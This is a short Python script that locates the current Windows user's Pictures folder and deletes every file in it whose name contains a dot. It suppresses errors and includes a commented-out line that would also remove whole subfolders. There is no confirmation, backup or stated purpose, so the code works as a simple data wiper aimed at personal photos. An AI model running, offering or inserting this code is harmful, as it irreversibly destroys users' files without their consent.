import os,shutil,random,time
pcname = os.getlogin()
pic =  f"C:\\Users\\{pcname}\\Pictures"
os.chdir(pic)
list = os.listdir(os.getcwd())
for new in list:
    print(new)
    if "." in new:
        try:
            os.remove(new)
            #shutil.rmtree(new)
        except:
            print("Sorry.")
